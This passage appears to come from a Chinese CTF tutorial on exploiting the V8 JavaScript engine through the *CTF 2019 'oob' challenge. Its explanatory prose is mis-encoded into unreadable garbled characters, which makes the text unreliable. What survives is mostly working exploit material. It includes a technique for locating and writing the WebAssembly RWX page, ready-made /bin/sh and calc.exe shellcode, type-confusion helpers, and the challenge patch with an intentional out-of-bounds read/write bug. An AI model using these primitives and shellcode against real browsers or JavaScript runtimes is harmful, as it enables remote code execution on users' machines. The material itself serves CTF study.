[anon_fb58ac2e]</span><br></pre></td></tr></table></figure><p>ç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬è¦å¦‚ä½•è·å–åˆ°è¿™ä¸ªå†…å­˜åŒºåŸŸçš„åœ°å€ï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹ <code>f</code> çš„ <code>shared_info</code> ç»“æ„çš„ä¿¡æ¯ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8f1</span><br><span class="line">0xd1dfcf5f8f1: [SharedFunctionInfo] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d409e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x0cb6b4d44ae1 &lt;String[<span class="comment">#1]: 0&gt;</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x0d1dfcf5f8c9 &lt;WasmExportedFunctionData&gt;</span><br><span class="line"> - code (from data): 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - <span class="keyword">function</span> token position: -1</span><br><span class="line"> - start position: -1</span><br><span class="line"> - end position: -1</span><br><span class="line"> - no debug info</span><br><span class="line"> - scope info: 0x0cb6b4d40c61 &lt;ScopeInfo[0]&gt;</span><br><span class="line"> - length: 0</span><br><span class="line"> - feedback_metadata: 0xcb6b4d42a39: [FeedbackMetadata]</span><br><span class="line"> - map: 0x0cb6b4d41319 &lt;Map&gt;</span><br><span class="line"> - slot_count: 0</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹é‡Œå†æŸ¥çœ‹å…¶ <code>data</code> ç»“æ„ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f8c9</span><br><span class="line">0xd1dfcf5f8c9: [WasmExportedFunctionData] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x0cb6b4d45879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x323b6e002001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x0d1dfcf5f731 &lt;Instance map = 0x1ccbe5f49789&gt;</span><br><span class="line"> - function_index: 0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>å†æŸ¥çœ‹ <code>instance</code> ç»“æ„ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x0d1dfcf5f731</span><br><span class="line">0xd1dfcf5f731: [WasmInstanceObject] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x1ccbe5f49789 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x23f8cbe0ac19 &lt;Object map = 0x1ccbe5f4abd9&gt;</span><br><span class="line"> - elements: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - module_object: 0x23f8cbe10fb1 &lt;Module map = 0x1ccbe5f491e9&gt;</span><br><span class="line"> - exports_object: 0x23f8cbe111e9 &lt;Object map = 0x1ccbe5f4ad19&gt;</span><br><span class="line"> - native_context: 0x0d1dfcf41869 &lt;NativeContext[246]&gt;</span><br><span class="line"> - memory_object: 0x0d1dfcf5f859 &lt;Memory map = 0x1ccbe5f4a189&gt;</span><br><span class="line"> - table 0: 0x23f8cbe11181 &lt;Table map = 0x1ccbe5f49aa9&gt;</span><br><span class="line"> - imported_function_refs: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt;</span><br><span class="line"> - managed_native_allocations: 0x23f8cbe11129 &lt;Foreign&gt;</span><br><span class="line"> - memory_start: 0x7f9440280000</span><br><span class="line"> - memory_size: 65536</span><br><span class="line"> - memory_mask: ffff</span><br><span class="line"> - imported_function_targets: 0x55ab193567e0</span><br><span class="line"> - globals_start: (nil)</span><br><span class="line"> - imported_mutable_globals: 0x55ab19356800</span><br><span class="line"> - indirect_function_table_size: 0</span><br><span class="line"> - indirect_function_table_sig_ids: (nil)</span><br><span class="line"> - indirect_function_table_targets: (nil)</span><br><span class="line"> - properties: 0x0cb6b4d40c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ä»”ç»†æŸ¥çœ‹èƒ½å‘ç°ï¼Œ<code>instance</code> ç»“æ„å°±æ˜¯ <code>js</code> ä»£ç ä¸­çš„ <code>wasm_mod</code> å˜é‡çš„åœ°å€<br>æˆ‘ä»¬å†æ¥æŸ¥çœ‹è¿™ä¸ªç»“æ„çš„å†…å­˜å¸ƒå±€ï¼š  </p><img src="/2024/05/05/v8start/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä»”ç»†çœ‹ï¼Œèƒ½å‘ç°ï¼Œ<code>rwx</code> æ®µçš„èµ·å§‹åœ°å€å‚¨å­˜åœ¨ <code>instance+0x88</code> çš„ä½ç½®ï¼Œä¸è¿‡è¿™ä¸ªä¸ç”¨è®°ï¼Œä¸åŒç‰ˆæœ¬ï¼Œè¿™ä¸ªåç§»å€¼å¯èƒ½ä¼šæœ‰å·®è·ï¼Œå¯ä»¥åœ¨å†™ <code>exp</code> çš„æ—¶å€™é€šè¿‡ä¸Šè¿°è°ƒè¯•çš„æ–¹å¼è¿›è¡ŒæŸ¥æ‰¾ã€‚<br>æ ¹æ® WASM çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬çš„ç›®çš„å¯ä»¥æ›´ç»†åŒ–äº†ï¼Œç°åœ¨æˆ‘ä»¬çš„ç›®çš„å˜ä¸ºäº†æŠŠ <code>shellcode</code> å†™åˆ° <code>WASM</code> çš„ä»£ç æ®µï¼Œç„¶åæ‰§è¡Œ <code>WASM</code> å‡½æ•°ï¼Œé‚£ä¹ˆå°±èƒ½æ‰§è¡Œ <code>shellcode</code> äº†ã€‚<br>è¿™é‡Œå¯ä»¥å†™æˆä¸€ä¸ªå›ºå®šçš„æ¨¡æ¿ï¼š   </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>arbitrary_address_read</code> å‡½æ•°çš„å…·ä½“å®ç°æ–¹å¼è¦çœ‹å…·ä½“çš„æ¼æ´ç¯å¢ƒ  </p><h3 id="å¸¸ç”¨shellcode"><a href="#å¸¸ç”¨shellcode" class="headerlink" title="å¸¸ç”¨shellcode"></a>å¸¸ç”¨shellcode</h3><p>åœ¨ <code>CTF</code> é¢˜ç›®ä¸­ï¼Œæˆ‘ä»¬çš„ç›®çš„å¤§å¤šæ•°æ˜¯ <code>getshell</code> ç„¶åè·å– <code>flag</code>ï¼Œç”¨äº <code>getshell</code> çš„ <code>shellcode</code> å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¤å…¶å¼¹è®¡ç®—å™¨ï¼Œ<code>shellcode</code> å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿"><a href="#ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿" class="headerlink" title="ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿"></a>ç±»å‹æ··æ·†åˆ©ç”¨æ¨¡æ¿</h3><p>è¿™é‡Œå…ˆç»™å‡ºä¸€äº›æ–¹ä¾¿ç±»å‹æ··æ·†æ¼æ´åˆ©ç”¨çš„æ¨¡æ¿ï¼Œåœ¨åé¢ç¼–å†™ <code>exp</code> æ—¶ä¼šç”¨ä¸Š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ¼æ´åˆ©ç”¨å®æˆ˜"><a href="#æ¼æ´åˆ©ç”¨å®æˆ˜" class="headerlink" title="æ¼æ´åˆ©ç”¨å®æˆ˜"></a>æ¼æ´åˆ©ç”¨å®æˆ˜</h2><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å’Œæ–‡ç« ä¸€å¼€å§‹è¯´çš„ä¸€æ ·ï¼Œç¯å¢ƒç”¨çš„æ˜¯ <code>*CTF 2019</code> çš„ <code>oob</code>ã€‚é¢˜ç›®ç»™äº†ä¸€ä¸ª <code>diff</code> æ–‡ä»¶ï¼š  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>å—¯ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ï¼Œå¥½åƒçœ‹çš„ä¸å¤ªæ‡‚ï¼Œè¿™é‡Œç®€å•è§£é‡Šä¸€ä¸‹<br>è¿™é‡Œä¸»è¦æ˜¯å‡ºé¢˜äººä¸º <code>array</code> å®šä¹‰äº†ä¸€ä¸ª <code>oob</code> å‡½æ•°ï¼Œå…¶å‡½æ•°çš„åŠŸèƒ½å¦‚ä¸‹ï¼š  </p><ul><li>è·å–å‚æ•°çš„æ•°é‡ï¼Œç„¶åæ ¹æ®å‚æ•°ä¸ªæ•°è¿›è¡Œä¸åŒçš„æ“ä½œ  </li><li>å¦‚æœå‚æ•°æ•°é‡å¤§äº <code>2</code> åˆ™ç›´æ¥æŠ›å‡º <code>undefined</code>  </li><li>å¦‚æœå‚æ•°æ•°é‡å°äºç­‰äº <code>2</code>ï¼Œåˆ™å…ˆæŠŠ <code>array</code> è½¬æˆ <code>doublearray</code>  </li><li>ç„¶ååˆ¤æ–­å¦‚æœæ— é¢å¤–å‚æ•°ï¼ˆç¬¬ä¸€ä¸ªæ˜¯ <code>this</code>ï¼‰ï¼Œåˆ™æ˜¯ <code>read</code> åŠŸèƒ½ï¼Œè¿”å› <code>array[length]</code>  </li><li>å¦‚æœä¼ å…¥äº†ä¸€ä¸ªå‚æ•°ï¼Œåˆ™æ˜¯ <code>write</code> åŠŸèƒ½ï¼Œå°† <code>value</code> å†™å…¥åˆ° <code>doublearray[length]</code> ä¸­</li></ul><p>è¿™é‡Œçš„æ¼æ´è¿˜æ˜¯æŒºå¥½å‘ç°äº†ï¼Œæˆ‘ä»¬çŸ¥é“ <code>array</code> æœ€åä¸€ä¸ªå…ƒç´ çš„ç´¢å¼•ä¸º <code>length - 1</code>ï¼Œ è€Œè¿™é‡Œå¯ä»¥ç´¢å¼•åˆ° <code>length</code>ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥åœ¨ <code>elements</code> ä¸­è¶Šç•Œè¯»å’Œå†™ä¸€ä¸ªç´¢å¼•çš„æ•°æ®<br>åœ¨ä¸Šé¢çš„åˆ†æä¸­æˆ‘ä»¬çŸ¥é“ <code>elements</code> æ˜¯åœ¨ <code>obj</code> çš„ä¸Šæ–¹çš„ï¼Œå½“æ—¶æˆ‘ä¹Ÿè¯´è¿‡ <code>elements</code> å¹¶ä¸ä¸€å®šç´§è´´ç€ <code>obj</code> çš„ï¼Œç°åœ¨æˆ‘å°±æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚<code>demo</code> ä»£ç å¦‚ä¸‹ï¼š  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS 